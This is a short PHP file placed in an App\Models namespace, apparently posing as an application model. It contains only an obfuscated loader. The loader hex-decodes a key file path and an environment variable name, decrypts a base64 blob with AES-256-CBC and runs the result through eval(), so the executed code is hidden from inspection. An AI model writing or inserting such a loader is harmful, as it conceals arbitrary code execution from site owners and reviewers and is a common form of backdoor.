<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('7pujaTJlch6VV8yX38ob6A==');

$c=base64_decode(

'Cz6pyZ4j1XaznwUVzQg+5Yep96LPS87b50iX7ipzIy83EvbUw2uYv/57Rjv0U2OL45SZVoODbXhM' .
'Zf1IsEatxlOmg/3VluGSpiWTKUMe7bqQtfOXANMSqaU/S956wMA4ijRBVhutVm5rBQ/zajar8bOU' .
'QMewqaFvB2+QP4oZajynwLgcsQ/G27pVDCCRxIh56xEW+okeoYT1KBrU9IwE9X97JRw8SgjvRtQM' .
'30TO7G4nzh8xB4EUAdlFtEYO5W9LF742yQwulJNeWbBFybeV3GTu38w8O9ncuzaftQU5UFbGvBvv' .
'BF2yp61lkJ/kxDGP366rfD6A68mgyGUMc0myr6nLAtTgANjwzJT8+uux/oxxHP5BLSKbTqyqWgQy' .
'jXApEyMPPglxqz+kYX9tO4KsPYIL18Dce/y8n+QMSDhuA/ZR0/aV3bvO8y2LxloBa8Fb0eI8RBw2' .
'ET1Eo1mhcDpe1GzOuGTkI3SqFE1gcJICQYmRdiEj51F7hDz6Xo7KppNYP3grzcylu+whnmouU3bX' .
'Vqtx9iHS9X6PjbEYpu+Z4XWjg5dEVpJmYggwkrpV0HrzXnx5Wd0SdsRhHzD8ibgz2lAH34P0MZFP' .
'EZsPJgVU5wbqTcJhY79RzgKwVUVSzciHNJ0pMz7kch5qKCJ7k8DMNhlUEWb5KYW56SacM8t9AB/4' .
'Wk7sbmBbOuGmyjYOLgXm9vzmT3Wp9fZLFb5mofDkuT8B/B0RW6phCsgHg1Z05vUdmR/gx0oSgv8E' .
'VdknR0DrVzR4pvFyU6d6mzyc2BngEaphujxbL/s4BePWTbsueSjgPpZBVeKSxA0X3nDmeX5C3rYW' .
'WeqbhFBe38AddLW6b+N0WpUkbe4HnCVmIt2FNCBA0TokqepLMS8wDDJHGDk31LAVPw2Ck1L+065W' .
'Om1gLl2rCp0pLv2psc6ms/WoAmf4HidkODt9Ib4+VRB6fxzxICg5xYrHcyGL7Lz9B/nqXQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

